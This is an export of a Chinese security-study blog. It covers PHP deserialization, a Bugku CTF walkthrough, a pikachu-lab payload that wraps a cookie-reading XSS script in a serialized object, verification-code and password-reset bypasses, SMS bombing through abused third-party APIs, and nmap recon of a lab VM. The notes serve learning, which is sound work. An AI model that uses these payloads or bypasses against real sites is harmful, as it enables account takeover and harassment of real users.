<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;s:6:&quot;dralin&quot;;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$key</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>运行结果:<br><img src="https://pic.imgdb.cn/item/6537d139c458853aef7436b2.jpg" alt="图二" title="无类反序列化结果"><br>还原成原本的字符串。<br>(1)、无类情况下较为简单,就是简单的转化。<br>(2)、以上两个实例可以简单区分序列化(将对象转为字符串)与反序列化(将字符串还原成对象)。</p>
<h3 id="有类情况"><a href="#有类情况" class="headerlink" title="有类情况"></a>有类情况</h3><p>前言:有类情况下较上述情况复杂,因为有类的话会在程序执行的特定时间点,会自动调用魔术方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ABC</span></span>&#123; <span class="hljs-comment">//定义了一个类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-comment">//在创建对象(new)时自动调用</span><br>        <span class="hljs-variable">$test</span> = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;调用了构造函数&lt;br&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-comment">//在执行serialize()和程序彻底结束的时候调用</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;调用了析构函数&lt;br&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-comment">//调用unserialize()自动调用</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;调用了苏醒函数&lt;br&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;创建对象a&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> ABC;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;序列化&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$a_ser</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;反序列化&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$a_unser</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a_ser</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;对象快要被销毁了！&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>运行结果:<br><img src="https://pic.imgdb.cn/item/6537d145c458853aef746dfb.jpg" alt="图三" title="有类执行结果"><br>这里调用析构函数时并不是在调用serialize()后立刻执行,而是在所有语句执行完后在执行。如果序列化那段代码放到反序列化那段代码后,即:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> ABC;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;反序列化&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$a_unser</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a_ser</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;对象快要被销毁了！&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;序列化&lt;br&gt;&#x27;</span>;<br><span class="hljs-variable">$a_ser</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>那么就会只执行一次(因为本身就在最后)。</p>
<h2 id="ctf真题bugku"><a href="#ctf真题bugku" class="headerlink" title="ctf真题bugku"></a>ctf真题bugku</h2><p>题目:点login咋没反应<br>开启环境后,进来发现只有一个平平无奇的登录框。<br><img src="https://pic.imgdb.cn/item/6537d158c458853aef74bb6a.jpg" alt="图四" title="平平无奇"><br>查看源码,发现有一个css文件可以访问<br><img src="https://pic.imgdb.cn/item/6537d163c458853aef74ebdd.jpg" alt="图五" title="发现一个可以访问的文件"><br>访问后,发现就是一个普通的css样式,我刚开始看的时候还是没有发现什么问题,但是,细看上面有一个?4495,这是什么呢?<br><img src="https://pic.imgdb.cn/item/6537d16fc458853aef751cb3.jpg" alt="图六" title="?4495"><br>突然想起和网址栏上的属性与属性值,好像可以把这串东西填入,填入哪里呢?不久两个地方可以填吗,一个是这个css文件,另一个就是刚才的源码网址。<br>先试一下源码网址填入&#x2F;?4495<br><a href="http://114.67.175.224:13957/?4495">http://114.67.175.224:13957/?4495</a><br>发现跳转到一个界面。<br><img src="https://pic.imgdb.cn/item/6537d17bc458853aef754dd5.jpg" alt="图七" title="注意|关键点"><br>关键来了,这里有几个注意点:<br>1、$KEY值给出,那么下面必然会用到。<br>2、flag.php被包含了进来,那么猜测flag可能存在于这个文件,我该思考如何把里面的内容读出。<br>3、以cookie方式传输值,且属性是”BUGKU”(cookie传值时,写成BUGKU&#x3D;****)。<br>4、如果get请求包含4495,那么就会自动跳回此原来界面,而不会执行else if的语句打印flag。<br>5、else if内存在一个反序列化的函数,那么思路就是编程把$KEY的值序列化,然后通过cookie传输则可获取flag。<br>按照如上思路,先获取序列化的$KEY</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;ctf.bugku.com&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$key</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>抓包,添加cookie,且get请求内的4495要去掉<br><img src="https://pic.imgdb.cn/item/6537d180c458853aef7562b8.jpg" alt="图八" title="抓包|获取flag"><br>把获取到的flag提交即可。</p>
<h2 id="有类情况下的靶场练习-pikachu"><a href="#有类情况下的靶场练习-pikachu" class="headerlink" title="有类情况下的靶场练习(pikachu)"></a>有类情况下的靶场练习(pikachu)</h2><p>上面两道题都是无类情况,该情况构造序列化payload的代码相对简单,接下来是学习有类情况下如何构造payload。<br>由于是本地靶场,那么我可以先查看源码。<br><img src="https://pic.imgdb.cn/item/6538773ec458853aefe880ac.jpg" alt="图九" title="代码审计"><br>发现存在一个class类,而且存在一个创建对象会触发的魔术方法,那么可以考虑利用,但是发现就算利用的上也没啥大用,总不能改别人代码吧。此路不通,那么往下看,发现一个判断,意思是如果是接收的是序列化的值,那么会转为对象并赋值给unser;如果不是序列化的值,没用。<br>而且,它的打印输出语句不是echo,那么就要考虑写js语句(觉得应该是如果简单输出字符串,那么就对获取信息没啥用,所以考虑可获取cookie的js语句)。<br>构造payload(编程,目的是把payload序列化):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123; <span class="hljs-comment">//创建一个类</span><br>   <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>=<span class="hljs-string">&quot;pikachu&quot;</span>;<span class="hljs-comment">//赋初值</span><br>&#125;<br><span class="hljs-variable">$whoami</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">S</span>();<span class="hljs-comment">//创建一个对象</span><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>;<span class="hljs-comment">//构造payload,获取cookie</span><br><span class="hljs-variable">$whoami</span>-&gt;test=<span class="hljs-variable">$payload</span>;<span class="hljs-comment">//传输payload</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$whoami</span>);<span class="hljs-comment">//输出序列化的内容</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>关于上述代码的注意点:<br>如果对方有类,那么你构造的代码必须也含有类(类名也要相同),然后创建一个对象传输你要传输的数据(我称之为一一对应)。<br>运行后,获取到序列化的payload:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;S&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65387749c458853aefe8a472.jpg" alt="图十" title="代码构造payload"><br>把这句payload放入文本框,并submit，成功弹出cookie信息。<br><img src="https://pic.imgdb.cn/item/65387753c458853aefe8caac.jpg" alt="图十一" title="成功弹出cookie"></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/2023/10/21/fanxuliePHP/</url>
    <content><![CDATA[<h2 id="反序列化-序列化"><a href="#反序列化-序列化" class="headerlink" title="反序列化|序列化"></a>反序列化|序列化</h2><p>!!!反序列化是比较重要的,可以多方面找资源学习。<br>序列化（串行化）：是将变量转换为可保存或传输的字符串的过程(将程序对象（内存中的数据）转为方便存储的格式存储在文件（磁盘中）,即内存-&gt;磁盘)；<br>反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用；<br>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。<br><img src="https://pic.imgdb.cn/item/653481aac458853aef89d51a.png" alt="图一" title="序列化与反序列化"><br>对象-&gt;字符串 –序列化–serialize()<br>字符串-&gt;对象 –反序列化–unserialize()</p>
<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p><img src="https://pic.imgdb.cn/item/6534819dc458853aef89a8b2.png" alt="图二" title="php反序列化"><br>参考：<br>反序列化详解:<br><a href="https://xz.aliyun.com/t/12507">https://xz.aliyun.com/t/12507</a><br><a href="https://www.php.cn/faq/454909.html">https://www.php.cn/faq/454909.html</a><br><a href="https://blog.csdn.net/m0_69637056/article/details/125692222">https://blog.csdn.net/m0_69637056/article/details/125692222</a><br>魔术方法详解:<br><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a><br><a href="https://blog.csdn.net/qq_51295677/article/details/123394848">https://blog.csdn.net/qq_51295677/article/details/123394848</a><br>1、原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码<br>执行，SQL 注入，目录遍历等不可控后果。<br>2、如果代码中存在类(class):在反序列化的过程中可能会自动触发某些魔术方法。<br>PHP进行反序列化的两个函数:<br>serialize() &#x2F;&#x2F;将一个对象转换成一个字符串<br>unserialize() &#x2F;&#x2F;将字符串还原成一个对象<br>反序列化漏洞触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：<br>serialize() &#x2F;&#x2F;将一个对象转换成一个字符串<br>unserialize() &#x2F;&#x2F;将字符串还原成一个对象<br>触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：<br>__construct()	&#x2F;&#x2F;创建对象时触发<br>__destruct() 	&#x2F;&#x2F;对象被销毁时以及调用serialize()触发<br>__wakeup()      &#x2F;&#x2F;调用unserialize()触发<br>__call() 			&#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发<br>__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发<br>__get() 			&#x2F;&#x2F;用于从不可访问的属性读取数据<br>__set() 			&#x2F;&#x2F;用于将数据写入不可访问的属性<br>__isset() 		&#x2F;&#x2F;在不可访问的属性上调用 isset()或 empty()触发<br>__unset() 		&#x2F;&#x2F;在不可访问的属性上使用 unset()时触发<br>__invoke() 		&#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">php反序列化热身–无类–本地–简单了解原理:7:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">php反序列化ctf真题–无类–实例–加深了解原理:24:00</a><br>0、序列化的输出形式<br><img src="https://pic.imgdb.cn/item/65353036c458853aefe13346.png" alt="图三" title="输出形式"><br>1、序列化后(无类)的输出结果:<br><img src="https://pic.imgdb.cn/item/65353073c458853aefe2390b.png" alt="图四" title="序列化后(无类)的输出结果"><br>1.1、反序列化(无类)后的输出结果:<br><img src="https://pic.imgdb.cn/item/653530a3c458853aefe308a8.png" alt="图五" title="反序列化(无类)后的输出结果"><br>2、&#x3D;&#x3D;&#x3D;(强类型对比)是全等，两边类型和值都一样才行。&#x3D;&#x3D;(弱类型对比)含有隐形转换，会将两边的值按一定规则转换后作比较。&#x3D;是赋值。<br>3、ctf代码存在先后以及逻辑问题,一定要看清楚。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">php反序列化–有类魔术方法触发–本地–重点学习:39:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">php反序列化网鼎杯真题–有类魔术方法触发–实例–重点学习:51:00</a><br>1、魔术方法就是代码在执行的时候,执行到某一函数就会被隐式调用的方法(与vue框架的钩子函数对比?)。<br>2、有类情况下的简单输出<br><img src="https://pic.imgdb.cn/item/653530d6c458853aefe3cb3c.png" alt="图六" title="有类情况下的简单输出"><br>3、网鼎杯解题思路<br><img src="https://pic.imgdb.cn/item/65353105c458853aefe49805.png" alt="图七" title="网鼎杯解题思路"><br>(1)、有new就有构造，然后代码结束依次销毁用析构函数。<br>(2)、这道题写一个类就是为了传参数,把参数序列化利于传输。<br>4、反序列化,你要自己懂得如何serialize() unserialize()相互转化,以及它们之间的相互转化的PHP代码如何去写。<br>5、序列化的值利于传输、反序列化的利于还原和编译? </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=36&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">关于反序列化作用的小结:1:25:00</a><br>2、php反序列化,由于魔术方法的调用,可能会造成sql注入等的其他漏洞,这就是php反序列化漏洞。<br><img src="https://pic.imgdb.cn/item/65353130c458853aefe54f4e.png" alt="图八"></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>找回机制|接口安全</title>
    <url>/2023/10/19/jiekouanquan/</url>
    <content><![CDATA[<h2 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h2><p>客户端回显(浏览器、数据包可以看到)<br>Response 状态值(例如0改成1绕过)<br>验证码爆破<br>找回流程绕过(drop验证码的数据包)等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=34&vd_source=d32bce54780cf3d9710df43274886fde">墨者靶场密码重置-验证码套用-靶场(找回流程绕过):8:30</a><br>1、就是先把一个正常用户的手机话输入验证码后,点击提交时抓包,把手机号改成目标的,主要是这个靶场输入手机验证码与改密码处于同一个界面,导致数据包中的数据可以被篡改。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=34&vd_source=d32bce54780cf3d9710df43274886fde">手机邮箱验证码逻辑-客户端回显-实例:18:20~45:00都是干货</a><br>1、看手机验证码那里有一点迷,就是先用自己手机号获取一个正确的验证码,然后输入另一个手机号,输入自己之前抓包截获的那个验证码,提交后抓包,把新的验证码填入指定位置即可。(之前获得那个验证码只是为了验证码回显到数据包,这样才可自己篡改验证码)–演示(42:00)。<br>2、输入错误的验证码以及正确的验证码时,对方会回一个数据包,从这个数据包可以看到验证码正确或者错误的状态码,我们可以把错误界面的状态码修改成正确界面的,从而实现绕过。但是这有一个前提,这个状态码的验证得是前端验证的才行,后端验证的话,改了也没用。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=34&vd_source=d32bce54780cf3d9710df43274886fde">绑定手机验证码逻辑-Rep 状态值篡改-实例–关于上一个知识点的真实网站测试:45:00(可以反复观摩)</a><br>1、通过这样操作只要知道别人的手机号,可以更改其密码了。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=34&vd_source=d32bce54780cf3d9710df43274886fde">找回密码验证码逻辑-爆破测试-实例:57:00</a><br>1、虽然简单粗暴,但限制很多。</p>
<h2 id="接口调用乱用"><a href="#接口调用乱用" class="headerlink" title="接口调用乱用"></a>接口调用乱用</h2><p>接口详解:<a href="https://www.elecfans.com/emb/jiekou/202304172059871.html">https://www.elecfans.com/emb/jiekou/202304172059871.html</a><br>短信轰炸，来电轰炸等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=34&vd_source=d32bce54780cf3d9710df43274886fde">某 APP 短信轰炸接口乱用-实例接口调用发包:1:06:00</a><br>1、利用平台发送验证码的接口,把多个平台的此类接口集合起来,截获发送验证码的数据包,用程序循环轰炸指定手机号。</p>
]]></content>
      <categories>
        <category>业务逻辑越权</category>
      </categories>
      <tags>
        <tag>业务逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>验证安全|验证码|接口|token</title>
    <url>/2023/10/20/jieko/</url>
    <content><![CDATA[<h2 id="大纲-思维导图"><a href="#大纲-思维导图" class="headerlink" title="大纲|思维导图"></a>大纲|思维导图</h2><p>图片来源于网络<br><img src="https://pic.imgdb.cn/item/6532210ac458853aef24038e.png" alt="图一" title="验证安全"><br><img src="https://pic.imgdb.cn/item/65322118c458853aef242da7.png" alt="图二" title="逻辑漏洞"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">讲解整体知识点,简要概况:1:00</a></p>
<h2 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h2><p>● 分类: 图片，手机或邮箱，语音，视频，操作等<br>● 原理: 验证生成或验证过程中的逻辑问题<br>● 危害: 账户权限泄漏，短信轰炸，遍历，任意用户操作等<br>● 漏洞: 客户端回显(已讲)，验证码复用，验证码爆破(已讲)，绕过等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">验证码识别插件及工具操作演示-实例:8:50</a><br>Pkav_Http_Fuzz:一个带图形验证码爆破识别的渗透测试工具。<br><a href="https://www.cnblogs.com/guojia000/p/14180685.html">https://www.cnblogs.com/guojia000/p/14180685.html</a><br>推荐:两款插件–软件不可以借助burpsuite实现爆破,插件可以。<br>captcha-killer:<br><a href="https://blog.csdn.net/doulicau/article/details/122981624">https://blog.csdn.net/doulicau/article/details/122981624</a><br><a href="https://www.cnblogs.com/cwkiller/p/12659549.html">https://www.cnblogs.com/cwkiller/p/12659549.html</a><br>reCAPTCHA:<br><a href="https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0">https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">验证码绕过本地及远程验证-本地及实例:28:00</a><br>1、远程(服务器)验证:pikachu靶场–onclientbao爆破,第一步先试一下正确的验证码,抓包,发现验证码对提示账号密码错误;第二次故意输入另一个账号,观察这个验证码有无失效,发现没有失效,那么这里就存在一个验证码复用的问题。为什么会出现这个逻辑漏洞,是因为对方的服务器上的验证验证码的代码存在逻辑漏洞(没有及时销毁session):在第一次验证时,若验证码正确,那么就会产生一个session保存这个结果,如果一次验证完后没有销毁,那么就会产生这个问题。<br>2、本地验证一般是前端(js)。<br>3、如何判断前&#x2F;后端验证?<br>右键-查看元素,如果在前端看到验证代码，那就是前端验证;反之是后端验证。<br>4、可以调用别的网站上的多个接口,通过验证码绕过,实现往别人手机号重复发送多次短信验证码,实现短信轰炸。</p>
<h2 id="token安全"><a href="#token安全" class="headerlink" title="token安全"></a>token安全</h2><p>● 基本上述同理，主要是验证中可存在绕过可继续后续测试<br>● token 爆破，token 客户端回显等<br>token在前面主要是防止CSRF的。<br>关于token的详解:<a href="https://blog.csdn.net/zheng_qq/article/details/120375798">https://blog.csdn.net/zheng_qq/article/details/120375798</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Token客户端回显绕过登录爆破演示–本地:57:00</a><br>1、关于token的爆破比较困难,因为token是在实时变化的,我们爆破时如果观察到下一个的token就包含在上一个数据包的回显中(token不是服务器产生的?),那这种情况就可以操作爆破,详情上网搜。否则爆破不了。<br>–原因是把token设置在了session文件中，并在前端输出token。</p>
<h2 id="接口安全问题"><a href="#接口安全问题" class="headerlink" title="接口安全问题"></a>接口安全问题</h2><p>● 调用，遍历，未授权，篡改等<br>● 调用案例：短信轰炸<br>● 遍历案列：UID 等遍历<br>● callback 回调 JSONP<br>● 参数篡改：墨者靶场<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">本地某URL下载接口ID值调用遍历测试-实例:1:14:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">Callback(回调)自定义返回调用安全-漏洞测试-实例:1:18:00</a><br>1、有点迷,好像是回调对面要取数据,我可以把js语句注入里面,那么可能存在跨站漏洞。<br>2、callback是对面接受返回值的一个接口(函数?),比如说支付成功,如何判断成功,那就是callback回调取支付成功的状态返回。</p>
<h2 id="总结-小技巧-拓展"><a href="#总结-小技巧-拓展" class="headerlink" title="总结|小技巧|拓展"></a>总结|小技巧|拓展</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=35&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">上述在实战中如何做到漏洞发现-bp功能点(bp进阶):1:18:00</a><br>1、bp里面的spider–爬虫,可以帮助在大量的数据包寻找token、uid等值(参数)的指定数据包,辅助找到网站带有xx功能的页面,就是对数据包进行了筛选。–感觉像是对网站进行简单的扫描、发现漏洞。</p>
]]></content>
      <categories>
        <category>业务逻辑越权</category>
      </categories>
      <tags>
        <tag>业务逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>my_serve_file|Record</title>
    <url>/2023/11/04/my-serve-file/</url>
    <content><![CDATA[<h2 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h2><p>这里你需要学习的有几个前置知识点:<br><code>1、nmap的参数意义。</code><br>nmap的扫描参数是很重要的,可以略微学习一下。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><code class="hljs diff">常用几种(me)<br><span class="hljs-deletion">-sV：服务版本检测。</span><br><span class="hljs-deletion">-sP：Ping扫描，用于探测存活主机。</span><br><span class="hljs-deletion">-sS：TCP SYN扫描，快速扫描常用端口。</span><br></code></pre></td></tr></table></figure>
<p>学习链接:<br><a href="https://zhuanlan.zhihu.com/p/585377081">https://zhuanlan.zhihu.com/p/585377081</a><br><a href="https://blog.csdn.net/weixin_41489908/article/details/132202381">https://blog.csdn.net/weixin_41489908/article/details/132202381</a><br><code>2、请确认你的靶机情况:若你是自己开虚拟机自己打,请把两台虚拟机的网络设置改成:&quot;仅主机模式&quot;;若是一个团队一起学习:请改为桥接</code><br>简而言之就是仅主机模式就是虚拟机仅与真实机连接(不能联网，只能Ping通虚拟机);桥接是与这整个局域网(路由器)连接。<br>关于虚拟机的几种网络设置的学习链接:<a href="https://blog.csdn.net/Edward1027/article/details/124785835">https://blog.csdn.net/Edward1027/article/details/124785835</a><br><img src="https://pic.imgdb.cn/item/65464a24c458853aefb6a9d8.jpg"><br><code>你确定你掌握了吗,那就开始吧。</code></p>
<h2 id="扫描主机ip-判断靶机ip-探针开放端口"><a href="#扫描主机ip-判断靶机ip-探针开放端口" class="headerlink" title="扫描主机ip|判断靶机ip|探针开放端口"></a>扫描主机ip|判断靶机ip|探针开放端口</h2><p>开启靶机,看到一个登录界面(?)。<br><img src="https://pic.imgdb.cn/item/65464a13c458853aefb650a5.jpg"><br>这算是一个比较真实的实战环境,就是开局啥也不给,全靠自己找。那么我们就可以开启kali,一顿乱扫先。<br>这里我两种方法都试了一下,由于-sP参数是仅扫主机,-sS参数(端口)可以直接判断哪台主机是靶机ip(192.168.146.129)。<br>sP参数判断存活主机<br><img src="https://pic.imgdb.cn/item/65464aafc458853aefb98e45.jpg"><br>sS参数扫描每个主机上的端口服务<br><img src="https://pic.imgdb.cn/item/65464a37c458853aefb70d6a.jpg"><br>且已知开放端口:</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">21</span>/tcp   <span class="hljs-built_in">open</span>  <span class="hljs-keyword">ftp</span><br><span class="hljs-number">22</span>/tcp   <span class="hljs-built_in">open</span>  ssh<br><span class="hljs-number">80</span>/tcp   <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span><br><span class="hljs-number">111</span>/tcp  <span class="hljs-built_in">open</span>  rpcbind<br><span class="hljs-number">445</span>/tcp  <span class="hljs-built_in">open</span>  microsoft-ds<br><span class="hljs-number">2049</span>/tcp <span class="hljs-built_in">open</span>  nfs<br><span class="hljs-number">2121</span>/tcp <span class="hljs-built_in">open</span>  ccproxy-<span class="hljs-keyword">ftp</span><br></code></pre></td></tr></table></figure>
<h2 id="扫描靶机端口-判断每个端口下的服务"><a href="#扫描靶机端口-判断每个端口下的服务" class="headerlink" title="扫描靶机端口|判断每个端口下的服务"></a>扫描靶机端口|判断每个端口下的服务</h2><p>既然知道了靶机的ip,那么开始扫描端口。</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">扫描「指定端口」，使用 -p 参数，可以一次扫描单个端口、多个端口、或扫描一个范围的端口<br>nmap <span class="hljs-number">192.168.31.180</span> -p <span class="hljs-number">80</span><br>nmap <span class="hljs-number">192.168.31.180</span> -p <span class="hljs-number">80,3389,22</span>,<span class="hljs-number">21</span><br>nmap <span class="hljs-number">192.168.31.180</span> -p <span class="hljs-number">1-65535</span><br></code></pre></td></tr></table></figure>
<p>这里其实用上面扫描主机时-sS参数即可,只是记录下思路。</p>
<h2 id="针对每个端口开始测试"><a href="#针对每个端口开始测试" class="headerlink" title="针对每个端口开始测试"></a>针对每个端口开始测试</h2><p>温馨ps:针对上面两个操作,nmap -sS -sV -A -n -p- ip(一步到位)<br>进入正题。</p>
<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><p>首先,经过端口扫描后发现开启了7个端口，分别是：21 22 80 111 445 2049 2121 开启了这些服务http，ftp，smb，ssh。先访问一下80端口得网页看看。<br>这里有个小插曲:我竟然进不去!(小闹剧,靶机不用时还是关机的好qwq)<br>引出一个习惯:扫描后一定要先ping一下看ping不ping得通。<br>好了,再次进入正题,进入80端口。<br>发现是一个简易的小网页,没有什么特别的。<br><img src="https://pic.imgdb.cn/item/65464ac6c458853aefba0e45.jpg"><br>有一个超链接点一下只是重定向到一个毫不相干的网页,不予理睬。</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><code>网页目录扫描</code>:使用web工具扫描：nikto，dirb，dirbuster<br>这里提供以上三个目录扫描工具的学习链接:<br>dirb:<a href="https://blog.csdn.net/qq_38612882/article/details/122648462">https://blog.csdn.net/qq_38612882/article/details/122648462</a><br>dirbuster:<a href="https://blog.csdn.net/weixin_41489908/article/details/115434107">https://blog.csdn.net/weixin_41489908/article/details/115434107</a><br>nikto:<a href="https://www.cnblogs.com/opama/p/4928657.html">https://www.cnblogs.com/opama/p/4928657.html</a><br><img src="https://pic.imgdb.cn/item/65464ad4c458853aefba575a.jpg"><br><img src="https://pic.imgdb.cn/item/65464aecc458853aefbabbe1.jpg"><br>这里发现了一个readme.txt文件,对这个文件进行访问。<br>发现一个密码,暂时不知道是用来登陆什么的。(可能是ssh或ftp服务的密码)<br><img src="https://pic.imgdb.cn/item/65464b12c458853aefbb53c7.jpg"></p>
